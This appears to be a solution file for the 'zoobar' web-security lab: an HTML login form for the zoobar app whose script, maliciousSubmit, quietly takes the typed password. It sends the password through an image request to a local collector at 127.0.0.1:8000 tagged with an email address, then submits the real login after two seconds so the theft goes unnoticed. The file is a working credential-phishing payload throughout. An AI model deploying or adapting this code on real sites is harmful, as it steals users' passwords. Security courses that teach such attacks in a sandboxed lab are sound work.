<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit="maliciousSubmit(event)">
  <table>
  <tr>
     <td>Username:</td>
    <td><input type="text" name="login_username" size="20"
    autocomplete="no" value=""></td>
  </tr>
  <tr>
     <td>Password:</td>
    <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
    <input type="submit" name="submit_login" value="Log in">
    <input type="submit" name="submit_registration" value="Register"></td>
  </tr>
  </table>
  <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
  </form>

  <script>
    function maliciousSubmit(event) {
      event.preventDefault()
      function execEmail() {
        (new Image()).src='http://127.0.0.1:8000?' + 'to=syssechacks@gmail.com' + '&payload=' + encodeURIComponent(document.getElementsByName('login_password')[0].value)+ '&random=' + Math.random()

      }
      execEmail()

      setTimeout(function (){
        var formContext = document.getElementsByName("loginform")[0]
        formContext.submit()
      }, 2000)

      
    }
  </script>
